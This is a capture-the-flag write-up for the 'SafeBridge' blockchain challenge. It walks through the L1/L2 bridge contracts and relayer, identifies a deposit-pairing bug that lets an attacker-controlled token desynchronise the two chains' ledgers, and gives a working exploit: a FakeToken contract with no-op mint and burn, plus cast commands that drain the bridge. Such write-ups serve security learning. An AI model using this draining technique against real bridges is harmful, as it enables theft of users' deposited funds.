# Blockchain
## SafeBridge

```Description
I’ve crafted what I believed to be an ultra-safe token bridge. Don’t believe it?

nc 47.251.56.125 1337
```

### Initial Analysis

In this challenge, we were provided with a zip file containing the necessary setup. The file includes numerous documents, but I’ll focus on explaining only the key ones. Let’s begin by examining Challenge.sol to grasp the objective of this challenge.

```
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Challenge {
    address public immutable BRIDGE;
    address public immutable MESSENGER;
    address public immutable WETH;

    constructor(address bridge, address messenger, address weth) {
        BRIDGE = bridge;
        MESSENGER = messenger;
        WETH = weth;
    }

    function isSolved() external view returns (bool) {
        return IERC20(WETH).balanceOf(BRIDGE) == 0;
    }
}

```

From the Challenge.sol file, it’s clear that our goal is to reduce the BRIDGE balance to 0. For those unfamiliar with the concept of a bridge in this context, it refers to a mechanism that allows the transfer of assets and information between two different blockchain networks. This functionality is crucial in a decentralized environment where interoperability between different blockchains is needed.

Now, let’s examine the challenge.py file to understand the details of the challenge setup.

```python
from typing import Dict

from eth_abi import abi

from ctf_launchers.pwn_launcher import PwnChallengeLauncher
from ctf_launchers.types import (DaemonInstanceArgs, LaunchAnvilInstanceArgs,
                                 UserData, get_additional_account,
                                 get_privileged_web3)
from ctf_launchers.utils import (anvil_setCodeFromFile, anvil_setStorageAt,
                                 deploy)


class Challenge(PwnChallengeLauncher):
    def get_anvil_instances(self) -> Dict[str, LaunchAnvilInstanceArgs]:
        return {
            "l1": self.get_anvil_instance(chain_id=78704, accounts=3, fork_url=None),
            "l2": self.get_anvil_instance(chain_id=78705, accounts=3, fork_url=None),
        }

    def get_daemon_instances(self) -> Dict[str, DaemonInstanceArgs]:
        return {"relayer": DaemonInstanceArgs(image="safe-bridge-relayer:latest")}

    def deploy(self, user_data: UserData, mnemonic: str) -> str:
        l1_web3 = get_privileged_web3(user_data, "l1")
        l2_web3 = get_privileged_web3(user_data, "l2")

        challenge = deploy(
            l1_web3,
            self.project_location,
            mnemonic=mnemonic,
            env={
                "L1_RPC": l1_web3.provider.endpoint_uri,
                "L2_RPC": l2_web3.provider.endpoint_uri,
            },
        )

        anvil_setCodeFromFile(
            l2_web3,
            "0x420000000000000000000000000000000000CAFe",
            "L2CrossDomainMessenger.sol:L2CrossDomainMessenger",
        )
        relayer = get_additional_account(mnemonic, 0)
        anvil_setStorageAt(
            l2_web3,
            "0x420000000000000000000000000000000000CAFe",
            hex(0),
            "0x" + relayer.address[2:].rjust(64, "0"),
        )
        default_xdomain_sender = "0x000000000000000000000000000000000000dEaD"
        anvil_setStorageAt(
            l2_web3,
            "0x420000000000000000000000000000000000CAFe",
            hex(5),
            "0x" + default_xdomain_sender[2:].rjust(64, "0"),
        )

        anvil_setCodeFromFile(
            l2_web3,
            "0x420000000000000000000000000000000000baBe",
            "L2ERC20Bridge.sol:L2ERC20Bridge",
        )
        l2messenger_addr = "0x420000000000000000000000000000000000CAFe"
        (l1_bridge_addr,) = abi.decode(
            ["address"],
            l1_web3.eth.call(
                {
                    "to": challenge,
                    "data": l1_web3.keccak(text="BRIDGE()")[:4].hex(),
                }
            ),
        )
        anvil_setStorageAt(
            l2_web3,
            "0x420000000000000000000000000000000000baBe",
            hex(0),
            "0x" + l2messenger_addr[2:].rjust(64, "0"),
        )
        anvil_setStorageAt(
            l2_web3,
            "0x420000000000000000000000000000000000baBe",
            hex(1),
            "0x" + l1_bridge_addr[2:].rjust(64, "0"),
        )

        anvil_setCodeFromFile(
            l2_web3,
            "0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000",
            "L2WETH.sol:L2WETH",
        )

        return challenge


Challenge().run()

```

From the code in challenge.py, we can see that the challenge is designed to create two blockchain networks, referred to as L1 and L2. The setup involves deploying various contracts on each chain, which we will explore in more detail later. By analyzing the deploy function from utils.py, we notice that it executes another deployment script located in Deploy.s.sol. Next, let’s delve into the contents of the Deploy.s.sol file.

```
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

import "src/L1/WETH.sol";
import "src/L1/L1CrossDomainMessenger.sol";
import "src/L1/L1ERC20Bridge.sol";
import "src/Challenge.sol";

import {Lib_PredeployAddresses} from "src/libraries/constants/Lib_PredeployAddresses.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Deploy is Script {
    function setUp() public {}

    function run() public {
        address system = getAddress(1);

        address challenge = deploy(system);

        vm.writeFile(vm.envOr("OUTPUT_FILE", string("/tmp/deploy.txt")), vm.toString(challenge));
    }

    function deploy(address system) internal returns (address challenge) {
        vm.createSelectFork(vm.envString("L1_RPC"));
        vm.startBroadcast(system);
        address relayer = getAdditionalAddress(0);
        L1CrossDomainMessenger l1messenger = new L1CrossDomainMessenger(relayer);
        WETH weth = new WETH();
        L1ERC20Bridge l1Bridge =
            new L1ERC20Bridge(address(l1messenger), Lib_PredeployAddresses.L2_ERC20_BRIDGE, address(weth));

        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), Lib_PredeployAddresses.L2_WETH, 2 ether);

        challenge = address(new Challenge(address(l1Bridge), address(l1messenger), address(weth)));
        vm.stopBroadcast();
    }

    function getAdditionalAddress(uint32 index) internal returns (address) {
        return getAddress(index + 2);
    }

    function getPrivateKey(uint32 index) private returns (uint256) {
        string memory mnemonic =
            vm.envOr("MNEMONIC", string("test test test test test test test test test test test junk"));
        return vm.deriveKey(mnemonic, index);
    }

    function getAddress(uint32 index) private returns (address) {
        return vm.addr(getPrivateKey(index));
    }
}

```

Upon closely examining the Deploy.s.sol file, it’s revealed that Challenge.sol is deployed on the L1 chain. Furthermore, as part of its setup, it deposits 2 ETH into the L1 bridge. This means our primary objective is to drain the bridge contract on L1. To provide more context on the bridge’s implementation, essentially, each chain has its own bridge contract. There’s also an off-chain relayer (relayer.py). This relayer typically processes bridge requests and relays messages between the bridges on each chain.

For your information, off-chain refers to activities or processes that take place outside of the blockchain network. The necessity for off-chain mechanisms in this scenario arises because contracts on different chains cannot directly interact with each other. In the context of blockchain technology, each chain operates in its own isolated environment. This isolation means that a contract on one chain cannot natively see, access, or trigger functions in a contract on another chain. To bridge this gap, off-chain relayers are employed. These relayers monitor events on one chain and then execute corresponding actions on another, effectively enabling communication and interaction between the two distinct blockchain networks.

Now, as mentioned before that the challenge.py try to setup the L1 and L2 chain by deploying some contracts. Let’s take a look on each of it one-by-one.

**L1ERC20Bridge.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IL1ERC20Bridge} from "./IL1ERC20Bridge.sol";
import {IL2ERC20Bridge} from "../L2/IL2ERC20Bridge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CrossDomainEnabled} from "../libraries/bridge/CrossDomainEnabled.sol";
import {Lib_PredeployAddresses} from "../libraries/constants/Lib_PredeployAddresses.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title L1ERC20Bridge
 * @dev The L1 ERC20 Bridge is a contract which stores deposited L1 funds and standard
 * tokens that are in use on L2. It synchronizes a corresponding L2 Bridge, informing it of deposits
 * and listening to it for newly finalized withdrawals.
 *
 */
contract L1ERC20Bridge is IL1ERC20Bridge, CrossDomainEnabled {
    using SafeERC20 for IERC20;

    address public l2TokenBridge;
    address public weth;
    // Maps L1 token to L2 token to balance of the L1 token deposited
    mapping(address => mapping(address => uint256)) public deposits;

    constructor(address _l1messenger, address _l2TokenBridge, address _weth) CrossDomainEnabled(_l1messenger) {
        l2TokenBridge = _l2TokenBridge;
        weth = _weth;
    }

    /**
     * @inheritdoc IL1ERC20Bridge
     */
    function depositERC20(address _l1Token, address _l2Token, uint256 _amount) external virtual {
        _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount);
    }

    /**
     * @inheritdoc IL1ERC20Bridge
     */
    function depositERC20To(address _l1Token, address _l2Token, address _to, uint256 _amount) external virtual {
        _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount);
    }

    function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        internal
    {
        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

        bytes memory message;
        if (_l1Token == weth) {
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
            );
        } else {
            message =
                abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
        }

        sendCrossDomainMessage(l2TokenBridge, message);
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
    }

    /**
     * @inheritdoc IL1ERC20Bridge
     */
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }

    /**
     * @inheritdoc IL1ERC20Bridge
     */
    function finalizeWethWithdrawal(address _from, address _to, uint256 _amount)
        external
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        finalizeERC20Withdrawal(weth, Lib_PredeployAddresses.L2_WETH, _from, _to, _amount);
    }
}

```

The contract we are looking at is the bridge contract for the L1 chain. Analyzing the functions it offers, our primary action seems to be the deposit function. The key parameters for this function are the address of the token on the L1 chain, the address of the corresponding token on the L2 chain, and the deposit amount. We can break down the deposit function into four main actions:

1. It transfers the specified amount of _l1Token from the sender to the contract itself.
2. It encodes a message to be sent to the other chain, which in this case is L2. This message is essentially the encoded version of a call to the finalizeDeposit function (which we can deduce that available in the bridge contract of L2).
3. It sends this encoded message by triggering the sendCrossDomainMessage function. We will explore this function in more detail shortly.
4. It updates the deposits[_l1Token][_l2Token] record with the amount that has just been deposited.

These steps provide a foundational understanding of how the deposit function operates within the bridge contract on the L1 chain. Now, let’s delve into the workings of the sendCrossDomainMessage function.

**CrossDomainEnabled.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity >0.5.0 <0.9.0;

import {ICrossDomainMessenger} from "./ICrossDomainMessenger.sol";

contract CrossDomainEnabled {
    // Messenger contract used to send and recieve messages from the other domain.
    address public messenger;

    /**
     * @param _messenger Address of the CrossDomainMessenger on the current layer.
     */
    constructor(address _messenger) {
        messenger = _messenger;
    }

    /**
     * Enforces that the modified function is only callable by a specific cross-domain account.
     * @param _sourceDomainAccount The only account on the originating domain which is
     *  authenticated to call this function.
     */
    modifier onlyFromCrossDomainAccount(address _sourceDomainAccount) {
        require(msg.sender == address(getCrossDomainMessenger()), "messenger contract unauthenticated");

        require(
            getCrossDomainMessenger().xDomainMessageSender() == _sourceDomainAccount,
            "wrong sender of cross-domain message"
        );

        _;
    }

    /**
     * Gets the messenger, usually from storage. This function is exposed in case a child contract
     * needs to override.
     * @return The address of the cross-domain messenger contract which should be used.
     */
    function getCrossDomainMessenger() internal virtual returns (ICrossDomainMessenger) {
        return ICrossDomainMessenger(messenger);
    }

    /**
     * Sends a message to an account on another domain
     * @param _crossDomainTarget The intended recipient on the destination domain
     * @param _message The data to send to the target (usually calldata to a function with
     *  `onlyFromCrossDomainAccount()`)
     */
    function sendCrossDomainMessage(address _crossDomainTarget, bytes memory _message) internal {
        getCrossDomainMessenger().sendMessage(_crossDomainTarget, _message);
    }
}

```

Upon examining this function, we observe that sendCrossDomainMessage attempts to call the sendMessage function, which is implemented in the CrossDomainMessenger. Let’s focus on the CrossDomainMessenger.

**CrossDomainMessenger.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ICrossDomainMessenger} from "./ICrossDomainMessenger.sol";

contract CrossDomainMessenger is ICrossDomainMessenger {
    address public relayer;
    uint256 public messageNonce;

    mapping(bytes32 => bool) public relayedMessages;
    mapping(bytes32 => bool) public successfulMessages;
    mapping(bytes32 => bool) public sentMessages;

    address internal xDomainMsgSender = 0x000000000000000000000000000000000000dEaD;
    address internal constant DEFAULT_XDOMAIN_SENDER = 0x000000000000000000000000000000000000dEaD;

    constructor(address _relayer) {
        relayer = _relayer;
    }

    modifier onlyRelayer() {
        require(msg.sender == relayer, "not relayer");
        _;
    }

    function xDomainMessageSender() public view returns (address) {
        require(xDomainMsgSender != DEFAULT_XDOMAIN_SENDER, "xDomainMessageSender is not set");
        return xDomainMsgSender;
    }

    /**
     * Sends a cross domain message to the target messenger.
     * @param _target Target contract address.
     * @param _message Message to send to the target.
     */
    function sendMessage(address _target, bytes memory _message) public {
        bytes memory xDomainCalldata = encodeXDomainCalldata(_target, msg.sender, _message, messageNonce);

        sentMessages[keccak256(xDomainCalldata)] = true;

        emit SentMessage(_target, msg.sender, _message, messageNonce);
        messageNonce += 1;
    }

    /**
     * Relays a cross domain message to a contract.
     * @param _target Target contract address.
     * @param _sender Message sender address.
     * @param _message Message to send to the target.
     * @param _messageNonce Nonce for the provided message.
     */
    function relayMessage(address _target, address _sender, bytes memory _message, uint256 _messageNonce)
        public
        onlyRelayer
    {
        // anti reentrance
        require(xDomainMsgSender == DEFAULT_XDOMAIN_SENDER, "already in execution");

        bytes memory xDomainCalldata = encodeXDomainCalldata(_target, _sender, _message, _messageNonce);

        bytes32 xDomainCalldataHash = keccak256(xDomainCalldata);

        require(successfulMessages[xDomainCalldataHash] == false, "Provided message has already been received.");

        xDomainMsgSender = _sender;
        (bool success,) = _target.call(_message);
        xDomainMsgSender = DEFAULT_XDOMAIN_SENDER;

        // Mark the message as received if the call was successful. Ensures that a message can be
        // relayed multiple times in the case that the call reverted.
        if (success == true) {
            successfulMessages[xDomainCalldataHash] = true;
            emit RelayedMessage(xDomainCalldataHash);
        } else {
            emit FailedRelayedMessage(xDomainCalldataHash);
        }
    }

    /**
     * Generates the correct cross domain calldata for a message.
     * @param _target Target contract address.
     * @param _sender Message sender address.
     * @param _message Message to send to the target.
     * @param _messageNonce Nonce for the provided message.
     * @return ABI encoded cross domain calldata.
     */
    function encodeXDomainCalldata(address _target, address _sender, bytes memory _message, uint256 _messageNonce)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSignature(
            "relayMessage(address,address,bytes,uint256)", _target, _sender, _message, _messageNonce
        );
    }
}

```

The sendMessage function in the contract primarily serves to emit the SentMessage(_target, msg.sender, _message, messageNonce); event. Based on our analysis of both CrossDomainEnabled and CrossDomainMessenger, it seems that the protocol for a chain to communicate with another is through the emission of an event. To deepen our understanding, examining the off-chain relayer as defined in relayer.py is essential.

Additionally, it’s noteworthy that there is another function named relayMessage. This function is responsible for decoding the relayed message and executing the call that is encoded within that message.

```python
import json
import os
import time
import traceback
from threading import Thread

import requests
from eth_abi import abi
from web3 import Web3
from web3.contract.contract import Contract
from web3.middleware.signing import construct_sign_and_send_raw_middleware

from ctf_launchers.types import (UserData, get_additional_account,
                                 get_unprivileged_web3)

ORCHESTRATOR = os.getenv("ORCHESTRATOR_HOST", "http://orchestrator:7283")
INSTANCE_ID = os.getenv("INSTANCE_ID")


class Relayer:
    def __init__(self):
        self.__required_properties = ["mnemonic", "challenge_address"]

    def start(self):
        while True:
            instance_body = requests.get(
                f"{ORCHESTRATOR}/instances/{INSTANCE_ID}"
            ).json()
            if instance_body["ok"] == False:
                raise Exception("oops")

            user_data = instance_body["data"]
            if any(
                [v not in user_data["metadata"] for v in self.__required_properties]
            ):
                time.sleep(1)
                continue

            break

        self._run(user_data)

    def _run(self, user_data: UserData):
        challenge_addr = user_data["metadata"]["challenge_address"]
        relayer = get_additional_account(user_data["metadata"]["mnemonic"], 0)

        l1 = get_unprivileged_web3(user_data, "l1")
        l1.middleware_onion.add(construct_sign_and_send_raw_middleware(relayer))
        l1.eth.default_account = relayer.address

        l2 = get_unprivileged_web3(user_data, "l2")
        l2.middleware_onion.add(construct_sign_and_send_raw_middleware(relayer))
        l2.eth.default_account = relayer.address

        (l1_messenger_addr,) = abi.decode(
            ["address"],
            l1.eth.call(
                {
                    "to": l1.to_checksum_address(challenge_addr),
                    "data": l1.keccak(text="MESSENGER()")[:4].hex(),
                }
            ),
        )
        l2_messenger_addr = "0x420000000000000000000000000000000000CAFe"

        with open(
            "/artifacts/out/CrossDomainMessenger.sol/CrossDomainMessenger.json", "r"
        ) as f:
            cache = json.load(f)
            messenger_abi = cache["metadata"]["output"]["abi"]

        l1_messenger = l1.eth.contract(
            address=l1.to_checksum_address(l1_messenger_addr), abi=messenger_abi
        )
        l2_messenger = l2.eth.contract(
            address=l2.to_checksum_address(l2_messenger_addr), abi=messenger_abi
        )

        Thread(
            target=self._relayer_worker, args=(l1, l1_messenger, l2_messenger)
        ).start()
        Thread(
            target=self._relayer_worker, args=(l2, l2_messenger, l1_messenger)
        ).start()

    def _relayer_worker(
        self, src_web3: Web3, src_messenger: Contract, dst_messenger: Contract
    ):
        _src_chain_id = src_web3.eth.chain_id
        _last_processed_block_number = 0

        while True:
            try:
                latest_block_number = src_web3.eth.block_number
                if _last_processed_block_number > latest_block_number:
                    _last_processed_block_number = latest_block_number

                print(
                    f"chain {_src_chain_id} syncing {_last_processed_block_number + 1} {latest_block_number}"
                )
                for i in range(
                    _last_processed_block_number + 1, latest_block_number + 1
                ):
                    _last_processed_block_number = i
                    logs = src_messenger.events.SentMessage().get_logs(
                        fromBlock=i, toBlock=i
                    )
                    for log in logs:
                        print(f"chain {_src_chain_id} got log {src_web3.to_json(log)}")
                        try:
                            tx_hash = dst_messenger.functions.relayMessage(
                                log.args["target"],
                                log.args["sender"],
                                log.args["message"],
                                log.args["messageNonce"],
                            ).transact()

                            dst_messenger.w3.eth.wait_for_transaction_receipt(tx_hash)
                            print(
                                f"chain {_src_chain_id} relay message hash: {tx_hash.hex()} src block number: {i}"
                            )
                            time.sleep(1)
                        except Exception as e:
                            print(e)
            except:
                traceback.print_exc()
                pass
            finally:
                time.sleep(1)


Relayer().start()

```

Reviewing the code in relayer.py, it becomes evident that the worker consistently monitors for the SentMessage event. Upon detection of this event, the worker takes action to relay the message contained within the event, executing the relayMessage function on the destination chain.

Let’s now turn our attention to the bridge contract on the L2 chain.

**L2ERC20Bridge.sol**

We start by examining the finalizeDeposit function in this contract. Essentially, this function is responsible for minting a new _l2Token on the L2 chain. In summary, whenever a deposit is made in the L1 chain’s bridge, an equivalent amount of _l2Token is minted on the L2 chain.

In the L2 bridge, there is also a withdraw function, which we can break down into three main steps:

1. It burns the specified amount of _l2Token.
2. It encodes a message to be sent to the other chain, L1 in this case. This message is an encoded version of a call to the finalizeERC20Withdrawal function.
3. It sends this encoded message by again triggering the sendCrossDomainMessage function.

Up to this point, we haven’t delved into the finalizeERC20Withdrawal function in the L1 bridge code. Here is the function definition:

```
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }

```

This function essentially reduces the stored amount from the deposits map and transfers back the _l1Token that was initially deposited.

To summarize, in the L1 Bridge, users can deposit tokens, which triggers the bridge’s relayer to relay a message to the L2 Bridge, resulting in the minting of new tokens there. Conversely, when withdrawing in the L2 Bridge, the bridge’s relayer again comes into play, relaying a message back to the L1 Bridge, which then facilitates the transfer of the originally deposited tokens back to the user.

Now that we have a comprehensive understanding of the challenge’s general flow, the next step is to identify where the bug might be located.

### Finding the Bug

We understand that the objective is to drain the bridge, and from the initial setup, we know that the bridge already has 2 ETH deposited in it. My approach here was to start by looking for a bug in the most basic aspect, which is how to drain the bridge. Naturally, the first thing that must be triggered is for the bridge to perform an ETH transfer. This can only happen if we initiate a withdrawal from the L2 bridge.

However, it’s apparent that for the withdrawal to take place, we must already have a balance in the deposits map. Therefore, it’s highly likely that there is a bug in the deposit function of the L1 bridge, causing the states of the L1 and L2 bridges to be unsynchronized.

Based on this backtracking thought process, we can start searching for the bug by focusing on the deposit function in the L1 bridge.

```
    function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        internal
    {
        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

        bytes memory message;
        if (_l1Token == weth) {
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
            );
        } else {
            message =
                abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
        }

        sendCrossDomainMessage(l2TokenBridge, message);
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
    }

```
Indeed, upon closer examination, a bug was identified. The flaw lies in the deposit process, specifically when depositing with a pair of (WETH, randomToken). When such a deposit is made, the L2 bridge is instructed to mint WETH on the L2 chain instead of the random token, but the balance updated in the L1 records the pair as (WETH, randomToken). This discrepancy leads to a state misalignment between L1 and L2. Here’s what happens when we execute depositERC20(WETH, randomToken, 2 ETH):

- On the L1 side, the stored state reflects a deposit of 2 ETH corresponding to the (WETH, randomToken) pair.
- Contrarily, on the L2 side, instead of the randomToken, 2 of WETH tokens are minted and credited to you. Essentially, this process results in receiving free WETH.

Due to the aforementioned bug, it becomes possible to withdraw WETH from the L2 chain, which then results in receiving it on the L1 chain. An important observation here is that the balance of the pair (WETH, randomToken) is not reduced as a result of this deposit. Instead, the balance reduction occurs for the pair (WETH, L2_WETH). Now, let’s consider a scenario where we control the randomToken, have set randomToken.l1Token to WETH, and can control the burn() function to ensure it doesn’t revert for any amount we specify.

In such a situation, executing withdraw(randomToken, 2 ETH) will trigger a message relay to the L1 chain, instructing it to transfer additional WETH to us on L1. This withdrawal will be successful because the L1 chain still recognizes a balance in the pair (WETH, randomToken). As a result, we end up receiving an extra amount of ETH.

Now that the bug has been pinpointed, we can progress to the exploitation phase.

### Exploitation

To start our exploit, we first initiate the challenge to retrieve the necessary information.

```
╰─❯ nc 47.251.56.125 1337
team token? <REDACTED>
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
creating private blockchain...
deploying challenge...

your private blockchain has been set up
it will automatically terminate in 1440 seconds
---
rpc endpoints:
    - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l1
    - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l2
private key:        0xb308373bfa60a8e22f7e38c2824a3095e3fbc086613a41d4620e80b057ac9e52
challenge contract: 0xbf1da21516b8975941638E0c8CD791713c88B15B

```

We aim to get the addresses of L1Bridge and WETH on the L1 chain with the help of foundry CLI tools.

```
cast call <CHALLENGE_CONTRACT> "WETH()" --rpc-url <RPC_URL_L1> --private-key <PRIVATE_KEY>
cast call <CHALLENGE_CONTRACT> "BRIDGE()" --rpc-url <RPC_URL_L1> --private-key <PRIVATE_KEY>
```

For the L2 contracts, their predetermined addresses can be found in Lib_PredeployAddresses.sol.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

library Lib_PredeployAddresses {
    address internal constant L2_CROSS_DOMAIN_MESSENGER = 0x420000000000000000000000000000000000CAFe;
    address internal constant L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe;
    address internal constant L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);
}
```

We also retrieve our address using the given private key.
```
cast wallet address --private-key <PRIVATE_KEY>
```
We proceed by creating our own token, which we name FakeToken. This token implements the IL2StandardERC20 interface defined in the challenge. In the FakeToken, we don’t need to fully implement the mint and burn functions; they just need to ensure they don’t revert. When deploying FakeToken, it’s crucial to set the _l1Token to the WETH address deployed on the L1 bridge, so that FakeToken represents a pair of (WETH, FakeToken).

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FakeToken {
    address public l1Token;
    constructor(address _l1Token) {
        l1Token = _l1Token;
    }

    function mint(address _to, uint256 _amount) external {
        return;
    }

    function burn(address _from, uint256 _amount) external {
        return;
    }
}
```

Next, we deploy this token on the L2 chain. The steps I did are:

- Create a new folder called fake-token.
- cd fake-token.
- Call forge init.
- Put the FakeToken.sol inside src folder.
- Call forge create ./src/FakeToken.sol:FakeToken --rpc-url <RPC_URL_L2> --private-key <PRIVATE_KEY> --constructor-args <L1_WETH>


Upon successful deployment, you should receive a confirmation output.

```
Deployer: 0xfD0D9669CA24Ed6De5B51A3B6bE1dcB33DC8681b
Deployed to: 0xB4d5bcb70Fa5e12387BbD98FC6D43752a8D59a23 <- <FAKE_TOKEN> address
Transaction hash: 0x41fe4d43167d9c77c46beb4521f9c465537ceb45f722a84e1318d92bfcd62299
```
The next step is to trigger depositERC20 on the L1 chain. We start by wrapping our native ether into WETH on L1.

```
cast send <L1_WETH> "deposit()" -r <RPC_URL_L1> --private-key <PRIVATE_KEY> --value 2ether
```

Then, we allow the L1 bridge to use our deposited WETH (2 ETH).

```
cast send <L1_WETH> "approve(address,uint256)" -r <RPC_URL_L1> --private-key <PRIVATE_KEY> -- <L1_BRIDGE> 2000000000000000000
```

Finally, we trigger the depositERC20(WETH, FakeToken, 2 ETH).

```
cast send <L1_BRIDGE> "depositERC20(address,address,uint256)" -r <RPC_URL_L1> --private-key <PRIVATE_KEY> -- <L1_WETH> <FAKE_TOKEN> 2000000000000000000
```

After making this call, the state of the L1 bridge balance will show:

- deposits[WETH][L2_WETH] = 2 ETH from the initial challenge deposit.
- deposits[WETH][FakeToken] = 2 ETH from our deposit.

To verify that the deposit worked and triggered the bug, we check the L2 chain balance. We should find 2 WETH there, confirming the bug’s activation.

```
cast call <L2_WETH> "balanceOf(address)" -r <RPC_URL_L2> --private-key <PRIVATE_KEY> -- <PLAYER_ADDRESS>
```
![alt text](https://i.imgur.com/TRSqQN5.png)

Then, we redeem this free WETH by calling withdraw(L2_WETH, 2 ETH).

```
cast send <L2_BRIDGE> "withdraw(address,uint256)" -r <RPC_URL_L2> --private-key <PRIVATE_KEY> -- <L2_WETH> 2000000000000000000
```
This action will change the L1 bridge state of deposits[WETH][L2_WETH] to 0. However, the deposits[WETH][FakeToken] will still show 2 ETH. Next, we make another withdrawal with withdraw(FakeToken, 2 ETH).

```
cast send <L2_BRIDGE> "withdraw(address,uint256)" -r <RPC_URL_L2> --private-key <PRIVATE_KEY> -- <FAKE_TOKEN> 2000000000000000000
```
This withdrawal will succeed, despite not having minted any FakeToken on the L2 chain (which would generally cause the burn() call to fail). This is because we own this token and our burn() function is essentially an empty function that does nothing. Next, the L2 bridge will relay a message to the L1, and the L1Bridge will finalize the withdrawal by reducing the deposits[WETH][FakeToken] to 0 and transferring another 2 ETH to us. As a result, the L1 bridge is successfully drained due to this bug.

```
╰─❯ nc 47.251.56.125 1337
team token? <REDACTED>
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
rwctf{yoU_draINED_BriD6E}
```



